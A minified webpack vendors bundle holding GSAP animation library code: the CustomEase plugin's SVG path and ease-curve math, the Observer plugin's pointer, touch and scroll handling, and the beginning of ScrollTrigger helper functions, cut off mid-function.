/*! For license information please see vendors.bundle.3c6f1acbc8d494b9891e.js.LICENSE.txt */
"use strict";
(self.webpackChunkhakaji = self.webpackChunkhakaji || []).push([
  [216], {
    297: function (t, e, i) {
      i.d(e, {
        t: function () {
          return x
        }
      });
      var n = /[achlmqstvz]|(-?\d*\.?\d*(?:e[\-+]?\d+)?)[0-9]/gi,
        r = /[\+\-]?\d*\.?\d+e[\+\-]?\d+/gi,
        s = Math.PI / 180,
        o = (Math.PI, Math.sin),
        a = Math.cos,
        l = Math.abs,
        c = Math.sqrt,
        h = (Math.atan2, function (t) {
          return "number" == typeof t
        }),
        u = 1e5,
        f = function (t) {
          return Math.round(t * u) / u || 0
        };

      function d(t, e, i, n, r, h, u, f, d) {
        if (t !== f || e !== d) {
          i = l(i), n = l(n);
          var p = r % 360 * s,
            m = a(p),
            v = o(p),
            g = Math.PI,
            y = 2 * g,
            _ = (t - f) / 2,
            b = (e - d) / 2,
            w = m * _ + v * b,
            x = -v * _ + m * b,
            T = w * w,
            S = x * x,
            k = T / (i * i) + S / (n * n);
          k > 1 && (i = c(k) * i, n = c(k) * n);
          var E = i * i,
            M = n * n,
            O = (E * M - E * S - M * T) / (E * S + M * T);
          O < 0 && (O = 0);
          var A = (h === u ? -1 : 1) * c(O),
            C = A * (i * x / n),
            D = A * (-n * w / i),
            P = (t + f) / 2 + (m * C - v * D),
            L = (e + d) / 2 + (v * C + m * D),
            R = (w - C) / i,
            B = (x - D) / n,
            I = (-w - C) / i,
            z = (-x - D) / n,
            Y = R * R + B * B,
            F = (B < 0 ? -1 : 1) * Math.acos(R / c(Y)),
            X = (R * z - B * I < 0 ? -1 : 1) * Math.acos((R * I + B * z) / c(Y * (I * I + z * z)));
          isNaN(X) && (X = g), !u && X > 0 ? X -= y : u && X < 0 && (X += y), F %= y, X %= y;
          var H, j = Math.ceil(l(X) / (y / 4)),
            W = [],
            V = X / j,
            N = 4 / 3 * o(V / 2) / (1 + a(V / 2)),
            q = m * i,
            U = v * i,
            G = v * -n,
            K = m * n;
          for (H = 0; H < j; H++) w = a(r = F + H * V), x = o(r), R = a(r += V), B = o(r), W.push(w - N * x, x + N * w, R + N * B, B - N * R, R, B);
          for (H = 0; H < W.length; H += 2) w = W[H], x = W[H + 1], W[H] = w * q + x * G + P, W[H + 1] = w * U + x * K + L;
          return W[H - 2] = f, W[H - 1] = d, W
        }
      }
      var p, m, v = function () {
          return p || "undefined" != typeof window && (p = window.gsap) && p.registerPlugin && p
        },
        g = function () {
          (p = v()) ? (p.registerEase("_CE", x.create), m = 1) : console.warn("Please gsap.registerPlugin(CustomEase)")
        },
        y = function (t) {
          return ~~(1e3 * t + (t < 0 ? -.5 : .5)) / 1e3
        },
        _ = /[-+=\.]*\d+[\.e\-\+]*\d*[e\-\+]*\d*/gi,
        b = /[cLlsSaAhHvVtTqQ]/g,
        w = function t(e, i, n, r, s, o, a, l, c, h, u) {
          var f, d = (e + n) / 2,
            p = (i + r) / 2,
            m = (n + s) / 2,
            v = (r + o) / 2,
            g = (s + a) / 2,
            y = (o + l) / 2,
            _ = (d + m) / 2,
            b = (p + v) / 2,
            w = (m + g) / 2,
            x = (v + y) / 2,
            T = (_ + w) / 2,
            S = (b + x) / 2,
            k = a - e,
            E = l - i,
            M = Math.abs((n - a) * E - (r - l) * k),
            O = Math.abs((s - a) * E - (o - l) * k);
          return h || (h = [{
            x: e,
            y: i
          }, {
            x: a,
            y: l
          }], u = 1), h.splice(u || h.length - 1, 0, {
            x: T,
            y: S
          }), (M + O) * (M + O) > c * (k * k + E * E) && (f = h.length, t(e, i, d, p, _, b, T, S, c, h, u), t(T, S, w, x, g, y, a, l, c, h, u + 1 + (h.length - f))), h
        },
        x = function () {
          function t(t, e, i) {
            m || g(), this.id = t, this.setData(e, i)
          }
          var e = t.prototype;
          return e.setData = function (t, e) {
            e = e || {};
            var i, s, o, a, c, h, u, f, m, v = (t = t || "0,0,1,1").match(_),
              g = 1,
              y = [],
              x = [],
              T = e.precision || 1,
              S = T <= 1;
            if (this.data = t, (b.test(t) || ~t.indexOf("M") && t.indexOf("C") < 0) && (v = function (t) {
                var e, i, s, o, a, c, h, u, f, p, m, v, g, y, _, b = (t + "").replace(r, (function (t) {
                    var e = +t;
                    return e < 1e-4 && e > -1e-4 ? 0 : e
                  })).match(n) || [],
                  w = [],
                  x = 0,
                  T = 0,
                  S = 2 / 3,
                  k = b.length,
                  E = 0,
                  M = "ERROR: malformed path: " + t,
                  O = function (t, e, i, n) {
                    p = (i - t) / 3, m = (n - e) / 3, h.push(t + p, e + m, i - p, n - m, i, n)
                  };
                if (!t || !isNaN(b[0]) || isNaN(b[1])) return console.log(M), w;
                for (e = 0; e < k; e++)
                  if (g = a, isNaN(b[e]) ? c = (a = b[e].toUpperCase()) !== b[e] : e--, s = +b[e + 1], o = +b[e + 2], c && (s += x, o += T), e || (u = s, f = o), "M" === a) h && (h.length < 8 ? w.length -= 1 : E += h.length), x = u = s, T = f = o, h = [s, o], w.push(h), e += 2, a = "L";
                  else if ("C" === a) h || (h = [0, 0]), c || (x = T = 0), h.push(s, o, x + 1 * b[e + 3], T + 1 * b[e + 4], x += 1 * b[e + 5], T += 1 * b[e + 6]), e += 6;
                else if ("S" === a) p = x, m = T, "C" !== g && "S" !== g || (p += x - h[h.length - 4], m += T - h[h.length - 3]), c || (x = T = 0), h.push(p, m, s, o, x += 1 * b[e + 3], T += 1 * b[e + 4]), e += 4;
                else if ("Q" === a) p = x + (s - x) * S, m = T + (o - T) * S, c || (x = T = 0), x += 1 * b[e + 3], T += 1 * b[e + 4], h.push(p, m, x + (s - x) * S, T + (o - T) * S, x, T), e += 4;
                else if ("T" === a) p = x - h[h.length - 4], m = T - h[h.length - 3], h.push(x + p, T + m, s + (x + 1.5 * p - s) * S, o + (T + 1.5 * m - o) * S, x = s, T = o), e += 2;
                else if ("H" === a) O(x, T, x = s, T), e += 1;
                else if ("V" === a) O(x, T, x, T = s + (c ? T - x : 0)), e += 1;
                else if ("L" === a || "Z" === a) "Z" === a && (s = u, o = f, h.closed = !0), ("L" === a || l(x - s) > .5 || l(T - o) > .5) && (O(x, T, s, o), "L" === a && (e += 2)), x = s, T = o;
                else if ("A" === a) {
                  if (y = b[e + 4], _ = b[e + 5], p = b[e + 6], m = b[e + 7], i = 7, y.length > 1 && (y.length < 3 ? (m = p, p = _, i--) : (m = _, p = y.substr(2), i -= 2), _ = y.charAt(1), y = y.charAt(0)), v = d(x, T, +b[e + 1], +b[e + 2], +b[e + 3], +y, +_, (c ? x : 0) + 1 * p, (c ? T : 0) + 1 * m), e += i, v)
                    for (i = 0; i < v.length; i++) h.push(v[i]);
                  x = h[h.length - 2], T = h[h.length - 1]
                } else console.log(M);
                return (e = h.length) < 6 ? (w.pop(), e = 0) : h[0] === h[e - 2] && h[1] === h[e - 1] && (h.closed = !0), w.totalPoints = E + e, w
              }(t)[0]), 4 === (i = v.length)) v.unshift(0, 0), v.push(1, 1), i = 8;
            else if ((i - 2) % 6) throw "Invalid CustomEase";
            for (0 == +v[0] && 1 == +v[i - 2] || function (t, e, i) {
                i || 0 === i || (i = Math.max(+t[t.length - 1], +t[1]));
                var n, r = -1 * +t[0],
                  s = -i,
                  o = t.length,
                  a = 1 / (+t[o - 2] + r),
                  l = -e || (Math.abs(+t[o - 1] - +t[1]) < .01 * (+t[o - 2] - +t[0]) ? function (t) {
                    var e, i = t.length,
                      n = 1e20;
                    for (e = 1; e < i; e += 6) + t[e] < n && (n = +t[e]);
                    return n
                  }(t) + s : +t[o - 1] + s);
                for (l = l ? 1 / l : -a, n = 0; n < o; n += 2) t[n] = (+t[n] + r) * a, t[n + 1] = (+t[n + 1] + s) * l
              }(v, e.height, e.originY), this.segment = v, a = 2; a < i; a += 6) s = {
              x: +v[a - 2],
              y: +v[a - 1]
            }, o = {
              x: +v[a + 4],
              y: +v[a + 5]
            }, y.push(s, o), w(s.x, s.y, +v[a], +v[a + 1], +v[a + 2], +v[a + 3], o.x, o.y, 1 / (2e5 * T), y, y.length - 1);
            for (i = y.length, a = 0; a < i; a++) u = y[a], f = y[a - 1] || u, (u.x > f.x || f.y !== u.y && f.x === u.x || u === f) && u.x <= 1 ? (f.cx = u.x - f.x, f.cy = u.y - f.y, f.n = u, f.nx = u.x, S && a > 1 && Math.abs(f.cy / f.cx - y[a - 2].cy / y[a - 2].cx) > 2 && (S = 0), f.cx < g && (f.cx ? g = f.cx : (f.cx = .001, a === i - 1 && (f.x -= .001, g = Math.min(g, .001), S = 0)))) : (y.splice(a--, 1), i--);
            if (c = 1 / (i = 1 / g + 1 | 0), h = 0, u = y[0], S) {
              for (a = 0; a < i; a++) m = a * c, u.nx < m && (u = y[++h]), s = u.y + (m - u.x) / u.cx * u.cy, x[a] = {
                x: m,
                cx: c,
                y: s,
                cy: 0,
                nx: 9
              }, a && (x[a - 1].cy = s - x[a - 1].y);
              x[i - 1].cy = y[y.length - 1].y - s
            } else {
              for (a = 0; a < i; a++) u.nx < a * c && (u = y[++h]), x[a] = u;
              h < y.length - 1 && (x[a - 1] = y[y.length - 2])
            }
            return this.ease = function (t) {
              var e = x[t * i | 0] || x[i - 1];
              return e.nx < t && (e = e.n), e.y + (t - e.x) / e.cx * e.cy
            }, this.ease.custom = this, this.id && p && p.registerEase(this.id, this.ease), this
          }, e.getSVGData = function (e) {
            return t.getSVGData(this, e)
          }, t.create = function (e, i, n) {
            return new t(e, i, n).ease
          }, t.register = function (t) {
            p = t, g()
          }, t.get = function (t) {
            return p.parseEase(t)
          }, t.getSVGData = function (e, i) {
            var n, r, s, o, a, l, c, u, d, m, v = (i = i || {}).width || 100,
              g = i.height || 100,
              _ = i.x || 0,
              b = (i.y || 0) + g,
              w = p.utils.toArray(i.path)[0];
            if (i.invert && (g = -g, b = 0), "string" == typeof e && (e = p.parseEase(e)), e.custom && (e = e.custom), e instanceof t) n = function (t) {
              h(t[0]) && (t = [t]);
              var e, i, n, r, s = "",
                o = t.length;
              for (i = 0; i < o; i++) {
                for (r = t[i], s += "M" + f(r[0]) + "," + f(r[1]) + " C", e = r.length, n = 2; n < e; n++) s += f(r[n++]) + "," + f(r[n++]) + " " + f(r[n++]) + "," + f(r[n++]) + " " + f(r[n++]) + "," + f(r[n]) + " ";
                r.closed && (s += "z")
              }
              return s
            }(function (t, e, i, n, r, s, o) {
              for (var a, l, c, h, u, f = t.length; --f > -1;)
                for (l = (a = t[f]).length, c = 0; c < l; c += 2) h = a[c], u = a[c + 1], a[c] = h * e + 0 * u + s, a[c + 1] = 0 * h + u * r + o;
              return t._dirty = 1, t
            }([e.segment], v, 0, 0, -g, _, b));
            else {
              for (n = [_, b], o = 1 / (c = Math.max(5, 200 * (i.precision || 1))), u = 5 / (c += 2), d = y(_ + o * v), r = ((m = y(b + e(o) * -g)) - b) / (d - _), s = 2; s < c; s++) a = y(_ + s * o * v), l = y(b + e(s * o) * -g), (Math.abs((l - m) / (a - d) - r) > u || s === c - 1) && (n.push(d, m), r = (l - m) / (a - d)), d = a, m = l;
              n = "M" + n.join(",")
            }
            return w && w.setAttribute("d", n), n
          }, t
        }();
      v() && p.registerPlugin(x), x.version = "3.11.3"
    },
    792: function (t, e, i) {
      i.d(e, {
        Z: function () {
          return He
        }
      });
      var n, r, s, o, a, l, c, h, u, f, d, p, m = function () {
          return n || "undefined" != typeof window && (n = window.gsap) && n.registerPlugin && n
        },
        v = 1,
        g = [],
        y = [],
        _ = [],
        b = Date.now,
        w = function (t, e) {
          return e
        },
        x = function (t, e) {
          return ~_.indexOf(t) && _[_.indexOf(t) + 1][e]
        },
        T = function (t) {
          return !!~f.indexOf(t)
        },
        S = function (t, e, i, n, r) {
          return t.addEventListener(e, i, {
            passive: !n,
            capture: !!r
          })
        },
        k = function (t, e, i, n) {
          return t.removeEventListener(e, i, !!n)
        },
        E = function () {
          return d && d.isPressed || y.cache++
        },
        M = function (t, e) {
          var i = function i(n) {
            if (n || 0 === n) {
              v && (s.history.scrollRestoration = "manual");
              var r = d && d.isPressed;
              n = i.v = Math.round(n) || (d && d.iOS ? 1 : 0), t(n), i.cacheID = y.cache, r && w("ss", n)
            } else(e || y.cache !== i.cacheID || w("ref")) && (i.cacheID = y.cache, i.v = t());
            return i.v + i.offset
          };
          return i.offset = 0, t && i
        },
        O = {
          s: "scrollLeft",
          p: "left",
          p2: "Left",
          os: "right",
          os2: "Right",
          d: "width",
          d2: "Width",
          a: "x",
          sc: M((function (t) {
            return arguments.length ? s.scrollTo(t, A.sc()) : s.pageXOffset || o.scrollLeft || a.scrollLeft || l.scrollLeft || 0
          }))
        },
        A = {
          s: "scrollTop",
          p: "top",
          p2: "Top",
          os: "bottom",
          os2: "Bottom",
          d: "height",
          d2: "Height",
          a: "y",
          op: O,
          sc: M((function (t) {
            return arguments.length ? s.scrollTo(O.sc(), t) : s.pageYOffset || o.scrollTop || a.scrollTop || l.scrollTop || 0
          }))
        },
        C = function (t) {
          return n.utils.toArray(t)[0] || ("string" == typeof t && !1 !== n.config().nullTargetWarn ? console.warn("Element not found:", t) : null)
        },
        D = function (t, e) {
          var i = e.s,
            r = e.sc;
          T(t) && (t = o.scrollingElement || a);
          var s = y.indexOf(t),
            l = r === A.sc ? 1 : 2;
          !~s && (s = y.push(t) - 1), y[s + l] || t.addEventListener("scroll", E);
          var c = y[s + l],
            h = c || (y[s + l] = M(x(t, i), !0) || (T(t) ? r : M((function (e) {
              return arguments.length ? t[i] = e : t[i]
            }))));
          return h.target = t, c || (h.smooth = "smooth" === n.getProperty(t, "scrollBehavior")), h
        },
        P = function (t, e, i) {
          var n = t,
            r = t,
            s = b(),
            o = s,
            a = e || 50,
            l = Math.max(500, 3 * a),
            c = function (t, e) {
              var l = b();
              e || l - s > a ? (r = n, n = t, o = s, s = l) : i ? n += t : n = r + (t - r) / (l - o) * (s - o)
            };
          return {
            update: c,
            reset: function () {
              r = n = i ? 0 : n, o = s = 0
            },
            getVelocity: function (t) {
              var e = o,
                a = r,
                h = b();
              return (t || 0 === t) && t !== n && c(t), s === o || h - o > l ? 0 : (n + (i ? a : -a)) / ((i ? h : s) - e) * 1e3
            }
          }
        },
        L = function (t, e) {
          return e && !t._gsapAllow && t.preventDefault(), t.changedTouches ? t.changedTouches[0] : t
        },
        R = function (t) {
          var e = Math.max.apply(Math, t),
            i = Math.min.apply(Math, t);
          return Math.abs(e) >= Math.abs(i) ? e : i
        },
        B = function () {
          var t, e, i, r;
          (u = n.core.globals().ScrollTrigger) && u.core && (t = u.core, e = t.bridge || {}, i = t._scrollers, r = t._proxies, i.push.apply(i, y), r.push.apply(r, _), y = i, _ = r, w = function (t, i) {
            return e[t](i)
          })
        },
        I = function (t) {
          return (n = t || m()) && "undefined" != typeof document && document.body && (s = window, o = document, a = o.documentElement, l = o.body, f = [s, o, a, l], n.utils.clamp, h = "onpointerenter" in l ? "pointer" : "mouse", c = z.isTouch = s.matchMedia && s.matchMedia("(hover: none), (pointer: coarse)").matches ? 1 : "ontouchstart" in s || navigator.maxTouchPoints > 0 || navigator.msMaxTouchPoints > 0 ? 2 : 0, p = z.eventTypes = ("ontouchstart" in a ? "touchstart,touchmove,touchcancel,touchend" : "onpointerdown" in a ? "pointerdown,pointermove,pointercancel,pointerup" : "mousedown,mousemove,mouseup,mouseup").split(","), setTimeout((function () {
            return v = 0
          }), 500), B(), r = 1), r
        };
      O.op = A, y.cache = 0;
      var z = function () {
        function t(t) {
          this.init(t)
        }
        var e;
        return t.prototype.init = function (t) {
          r || I(n) || console.warn("Please gsap.registerPlugin(Observer)"), u || B();
          var e = t.tolerance,
            i = t.dragMinimum,
            f = t.type,
            m = t.target,
            v = t.lineHeight,
            y = t.debounce,
            _ = t.preventDefault,
            w = t.onStop,
            x = t.onStopDelay,
            M = t.ignore,
            z = t.wheelSpeed,
            Y = t.event,
            F = t.onDragStart,
            X = t.onDragEnd,
            H = t.onDrag,
            j = t.onPress,
            W = t.onRelease,
            V = t.onRight,
            N = t.onLeft,
            q = t.onUp,
            U = t.onDown,
            G = t.onChangeX,
            K = t.onChangeY,
            Z = t.onChange,
            Q = t.onToggleX,
            $ = t.onToggleY,
            J = t.onHover,
            tt = t.onHoverEnd,
            et = t.onMove,
            it = t.ignoreCheck,
            nt = t.isNormalizer,
            rt = t.onGestureStart,
            st = t.onGestureEnd,
            ot = t.onWheel,
            at = t.onEnable,
            lt = t.onDisable,
            ct = t.onClick,
            ht = t.scrollSpeed,
            ut = t.capture,
            ft = t.allowClicks,
            dt = t.lockAxis,
            pt = t.onLockAxis;
          this.target = m = C(m) || a, this.vars = t, M && (M = n.utils.toArray(M)), e = e || 1e-9, i = i || 0, z = z || 1, ht = ht || 1, f = f || "wheel,touch,pointer", y = !1 !== y, v || (v = parseFloat(s.getComputedStyle(l).lineHeight) || 22);
          var mt, vt, gt, yt, _t, bt, wt, xt = this,
            Tt = 0,
            St = 0,
            kt = D(m, O),
            Et = D(m, A),
            Mt = kt(),
            Ot = Et(),
            At = ~f.indexOf("touch") && !~f.indexOf("pointer") && "pointerdown" === p[0],
            Ct = T(m),
            Dt = m.ownerDocument || o,
            Pt = [0, 0, 0],
            Lt = [0, 0, 0],
            Rt = 0,
            Bt = function () {
              return Rt = b()
            },
            It = function (t, e) {
              return (xt.event = t) && M && ~M.indexOf(t.target) || e && At && "touch" !== t.pointerType || it && it(t, e)
            },
            zt = function () {
              var t = xt.deltaX = R(Pt),
                i = xt.deltaY = R(Lt),
                n = Math.abs(t) >= e,
                r = Math.abs(i) >= e;
              Z && (n || r) && Z(xt, t, i, Pt, Lt), n && (V && xt.deltaX > 0 && V(xt), N && xt.deltaX < 0 && N(xt), G && G(xt), Q && xt.deltaX < 0 != Tt < 0 && Q(xt), Tt = xt.deltaX, Pt[0] = Pt[1] = Pt[2] = 0), r && (U && xt.deltaY > 0 && U(xt), q && xt.deltaY < 0 && q(xt), K && K(xt), $ && xt.deltaY < 0 != St < 0 && $(xt), St = xt.deltaY, Lt[0] = Lt[1] = Lt[2] = 0), (yt || gt) && (et && et(xt), gt && (H(xt), gt = !1), yt = !1), bt && !(bt = !1) && pt && pt(xt), _t && (ot(xt), _t = !1), mt = 0
            },
            Yt = function (t, e, i) {
              Pt[i] += t, Lt[i] += e, xt._vx.update(t), xt._vy.update(e), y ? mt || (mt = requestAnimationFrame(zt)) : zt()
            },
            Ft = function (t, e) {
              dt && !wt && (xt.axis = wt = Math.abs(t) > Math.abs(e) ? "x" : "y", bt = !0), "y" !== wt && (Pt[2] += t, xt._vx.update(t, !0)), "x" !== wt && (Lt[2] += e, xt._vy.update(e, !0)), y ? mt || (mt = requestAnimationFrame(zt)) : zt()
            },
            Xt = function (t) {
              if (!It(t, 1)) {
                var e = (t = L(t, _)).clientX,
                  n = t.clientY,
                  r = e - xt.x,
                  s = n - xt.y,
                  o = xt.isDragging;
                xt.x = e, xt.y = n, (o || Math.abs(xt.startX - e) >= i || Math.abs(xt.startY - n) >= i) && (H && (gt = !0), o || (xt.isDragging = !0), Ft(r, s), o || F && F(xt))
              }
            },
            Ht = xt.onPress = function (t) {
              It(t, 1) || (xt.axis = wt = null, vt.pause(), xt.isPressed = !0, t = L(t), Tt = St = 0, xt.startX = xt.x = t.clientX, xt.startY = xt.y = t.clientY, xt._vx.reset(), xt._vy.reset(), S(nt ? m : Dt, p[1], Xt, _, !0), xt.deltaX = xt.deltaY = 0, j && j(xt))
            },
            jt = function (t) {
              if (!It(t, 1)) {
                k(nt ? m : Dt, p[1], Xt, !0);
                var e = xt.isDragging && (Math.abs(xt.x - xt.startX) > 3 || Math.abs(xt.y - xt.startY) > 3),
                  i = L(t);
                e || (xt._vx.reset(), xt._vy.reset(), _ && ft && n.delayedCall(.08, (function () {
                  if (b() - Rt > 300 && !t.defaultPrevented)
                    if (t.target.click) t.target.click();
                    else if (Dt.createEvent) {
                    var e = Dt.createEvent("MouseEvents");
                    e.initMouseEvent("click", !0, !0, s, 1, i.screenX, i.screenY, i.clientX, i.clientY, !1, !1, !1, !1, 0, null), t.target.dispatchEvent(e)
                  }
                }))), xt.isDragging = xt.isGesturing = xt.isPressed = !1, w && !nt && vt.restart(!0), X && e && X(xt), W && W(xt, e)
              }
            },
            Wt = function (t) {
              return t.touches && t.touches.length > 1 && (xt.isGesturing = !0) && rt(t, xt.isDragging)
            },
            Vt = function () {
              return (xt.isGesturing = !1) || st(xt)
            },
            Nt = function (t) {
              if (!It(t)) {
                var e = kt(),
                  i = Et();
                Yt((e - Mt) * ht, (i - Ot) * ht, 1), Mt = e, Ot = i, w && vt.restart(!0)
              }
            },
            qt = function (t) {
              if (!It(t)) {
                t = L(t, _), ot && (_t = !0);
                var e = (1 === t.deltaMode ? v : 2 === t.deltaMode ? s.innerHeight : 1) * z;
                Yt(t.deltaX * e, t.deltaY * e, 0), w && !nt && vt.restart(!0)
              }
            },
            Ut = function (t) {
              if (!It(t)) {
                var e = t.clientX,
                  i = t.clientY,
                  n = e - xt.x,
                  r = i - xt.y;
                xt.x = e, xt.y = i, yt = !0, (n || r) && Ft(n, r)
              }
            },
            Gt = function (t) {
              xt.event = t, J(xt)
            },
            Kt = function (t) {
              xt.event = t, tt(xt)
            },
            Zt = function (t) {
              return It(t) || L(t, _) && ct(xt)
            };
          vt = xt._dc = n.delayedCall(x || .25, (function () {
            xt._vx.reset(), xt._vy.reset(), vt.pause(), w && w(xt)
          })).pause(), xt.deltaX = xt.deltaY = 0, xt._vx = P(0, 50, !0), xt._vy = P(0, 50, !0), xt.scrollX = kt, xt.scrollY = Et, xt.isDragging = xt.isGesturing = xt.isPressed = !1, xt.enable = function (t) {
            return xt.isEnabled || (S(Ct ? Dt : m, "scroll", E), f.indexOf("scroll") >= 0 && S(Ct ? Dt : m, "scroll", Nt, _, ut), f.indexOf("wheel") >= 0 && S(m, "wheel", qt, _, ut), (f.indexOf("touch") >= 0 && c || f.indexOf("pointer") >= 0) && (S(m, p[0], Ht, _, ut), S(Dt, p[2], jt), S(Dt, p[3], jt), ft && S(m, "click", Bt, !1, !0), ct && S(m, "click", Zt), rt && S(Dt, "gesturestart", Wt), st && S(Dt, "gestureend", Vt), J && S(m, h + "enter", Gt), tt && S(m, h + "leave", Kt), et && S(m, h + "move", Ut)), xt.isEnabled = !0, t && t.type && Ht(t), at && at(xt)), xt
          }, xt.disable = function () {
            xt.isEnabled && (g.filter((function (t) {
              return t !== xt && T(t.target)
            })).length || k(Ct ? Dt : m, "scroll", E), xt.isPressed && (xt._vx.reset(), xt._vy.reset(), k(nt ? m : Dt, p[1], Xt, !0)), k(Ct ? Dt : m, "scroll", Nt, ut), k(m, "wheel", qt, ut), k(m, p[0], Ht, ut), k(Dt, p[2], jt), k(Dt, p[3], jt), k(m, "click", Bt, !0), k(m, "click", Zt), k(Dt, "gesturestart", Wt), k(Dt, "gestureend", Vt), k(m, h + "enter", Gt), k(m, h + "leave", Kt), k(m, h + "move", Ut), xt.isEnabled = xt.isPressed = xt.isDragging = !1, lt && lt(xt))
          }, xt.kill = function () {
            xt.disable();
            var t = g.indexOf(xt);
            t >= 0 && g.splice(t, 1), d === xt && (d = 0)
          }, g.push(xt), nt && T(m) && (d = xt), xt.enable(Y)
        }, (e = [{
          key: "velocityX",
          get: function () {
            return this._vx.getVelocity()
          }
        }, {
          key: "velocityY",
          get: function () {
            return this._vy.getVelocity()
          }
        }]) && function (t, e) {
          for (var i = 0; i < e.length; i++) {
            var n = e[i];
            n.enumerable = n.enumerable || !1, n.configurable = !0, "value" in n && (n.writable = !0), Object.defineProperty(t, n.key, n)
          }
        }(t.prototype, e), t
      }();

      function Y(t) {
        return (Y = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (t) {
          return typeof t
        } : function (t) {
          return t && "function" == typeof Symbol && t.constructor === Symbol && t !== Symbol.prototype ? "symbol" : typeof t
        })(t)
      }
      z.version = "3.11.3", z.create = function (t) {
        return new z(t)
      }, z.register = I, z.getAll = function () {
        return g.slice()
      }, z.getById = function (t) {
        return g.filter((function (e) {
          return e.vars.id === t
        }))[0]
      }, m() && n.registerPlugin(z);
      var F, X, H, j, W, V, N, q, U, G, K, Z, Q, $, J, tt, et, it, nt, rt, st, ot, at, lt, ct, ht, ut, ft, dt, pt, mt, vt, gt, yt, _t = 1,
        bt = Date.now,
        wt = bt(),
        xt = 0,
        Tt = 0,
        St = function () {
          return $ = 1
        },
        kt = function () {
          return $ = 0
        },
        Et = function (t) {
          return t
        },
        Mt = function (t) {
          return Math.round(1e5 * t) / 1e5 || 0
        },
        Ot = function () {
          return "undefined" != typeof window
        },
        At = function () {
          return F || Ot() && (F = window.gsap) && F.registerPlugin && F
        },
        Ct = function (t) {
          return !!~N.indexOf(t)
        },
        Dt = function (t) {
          return x(t, "getBoundingClientRect") || (Ct(t) ? function () {
            return Ie.width = H.innerWidth, Ie.height = H.innerHeight, Ie
          } : function () {
            return Qt(t)
          })
        },
        Pt = function (t, e) {
          var i = e.s,
            n = e.d2,
            r = e.d,
            s = e.a;
          return (i = "scroll" + n) && (s = x(t, i)) ? s() - Dt(t)()[r] : Ct(t) ? (W[i] || V[i]) - (H["inner" + n] || W["client" + n] || V["client" + n]) : t[i] - t["offset" + n]
        },
        Lt = function (t, e) {
          for (var i = 0; i < nt.length; i += 3)(!e || ~e.indexOf(nt[i + 1])) && t(nt[i], nt[i + 1], nt[i + 2])
        },
        Rt = function (t) {
          return "string" == typeof t
        },
        Bt = function (t) {
          return "function" == typeof t
        },
        It = function (t) {
          return "number" == typeof t
        },
        zt = function (t) {
          return "object" === Y(t)
        },
        Yt = function (t, e, i) {
          return t && t.progress(e ? 0 : 1) && i && t.pause()
        },
        Ft = function (t, e) {
          if (t.enabled) {
            var i = e(t);
            i && i.totalTime && (t.callbackAnimation = i)
          }
        },
        Xt = Math.abs,
        Ht = "right",
        jt = "bottom",
        Wt = "width",
        Vt = "height",
        Nt = "padding",
        qt = "margin",
        Ut = "Width",
        Gt = "px",
        Kt = function (t) {
          return H.getComputedStyle(t)
        },
        Zt = function (t, e) {
          for (var i in e) i in t || (t[i] = e[i]);
          return t
        },
        Qt = function (t, e) {
          var i = e && "matrix(1, 0, 0, 1, 0, 0)" !== Kt(t)[J] && F.to(t, {
              x: 0,
              y: 0,
              xPercent: 0,
              yPercent: 0,
              rotation: 0,
              rotationX: 0,
              rotationY: 0,
              scale: 1,
              skewX: 0,
              skewY: 0
            }).progress(1),
            n = t.getBoundingClientRect();
          return i && i.progress(0).kill(), n
        },
        $t = function (t, e) {
          var i = e.d2;
          return t["offset" + i] || t["client" + i] || 0
        },
        Jt = function (t) {
          var e, i = [],
            n = t.labels,
            r = t.duration();
          for (e in n) i.push(n[e] / r);
          return i
        },
        te = function (t) {
          var e = F.utils.snap(t),
            i = Array.isArray(t) && t.slice(0).sort((function (t, e) {
              return t - e
            }));
          return i ? function (t, n, r) {
            var s;
            if (void 0 === r && (r = .001), !n) return e(t);
            if (n > 0) {
              for (t -= r, s = 0; s < i.length; s++)
                if (i[s] >= t) return i[s];
              return i[s - 1]
            }
            for (s = i.length, t += r; s--;)
              if (i[s] <= t) return i[s];
            return i[0]
          } : function (i, n, r) {
            void 0 === r && (r = .001);
            var s = e(i);
            return !n || Math.abs(s - i) < r || s - i < 0 == n < 0 ? s : e(n < 0 ? i - t : i + t)
          }
        },
        ee = function (t, e, i, n) {
          return i.split(",").forEach((function (i) {
            return t(e, i, n)
          }))
        },
        ie = function (t, e, i, n, r) {
          return t.addEventListener(e, i, {
            passive: !n,
            capture: !!r
          })
        },
        ne = function (t, e, i, n) {
          return t.removeEventListener(e, i, !!n)
        },
        re = function (t, e, i) {
          return i && i.wheelHandler && t(e, "wheel", i)
        },
        se = {
          startColor: "green",
          endColor: "red",
          indent: 0,
          fontSize: "16px",
          fontWeight: "normal"
        },
        oe = {
          toggleActions: "play",
          anticipatePin: 0
        },
        ae = {
          top: 0,
          left: 0,
          center: .5,
          bottom: 1,
          right: 1
        },
        le = function (t, e) {
          if (Rt(t)) {
            var i = t.indexOf("="),
              n = ~i ? +(t.charAt(i - 1) + 1) * parseFloat(t.substr(i + 1)) : 0;
            ~i && (t.indexOf("%") > i && (n *= e / 100), t = t.substr(0, i - 1)), t = n + (t in ae ? ae[t] * e : ~t.indexOf("%") ? parseFloat(t) * e / 100 : parseFloat(t) || 0)
          }
          return t
        },
        ce = function (t, e, i, n, r, s, o, a) {
          var l = r.startColor,
            c = r.endColor,
            h = r.fontSize,
            u = r.indent,
            f = r.fontWeight,
            d = j.createElement("div"),
            p = Ct(i) || "fixed" === x(i, "pinType"),
            m = -1 !== t.indexOf("scroller"),
            v = p ? V : i,
            g = -1 !== t.indexOf("start"),
            y = g ? l : c,
            _ = "border-color:" + y + ";font-size:" + h + ";color:" + y + ";font-weight:" + f + ";pointer-events:none;white-space:nowrap;font-family:sans-serif,Arial;z-index:1000;padding:4px 8px;border-width:0;border-style:solid;";
          return _ += "position:" + ((m || a) && p ? "fixed;" : "absolute;"), (m || a || !p) && (_ += (n === A ? Ht : jt) + ":" + (s + parseFloat(u)) + "px;"), o && (_ += "box-sizing:border-box;text-align:left;width:" + o.offsetWidth + "px;"), d._isStart = g, d.setAttribute("class", "gsap-marker-" + t + (e ? " marker-" + e : "")), d.style.cssText = _, d.innerText = e || 0 === e ? t + "-" + e : t, v.children[0] ? v.insertBefore(d, v.children[0]) : v.appendChild(d), d._offset = d["offset" + n.op.d2], he(d, 0, n, g), d
        },
        he = function (t, e, i, n) {
          var r = {
              display: "block"
            },
            s = i[n ? "os2" : "p2"],
            o = i[n ? "p2" : "os2"];
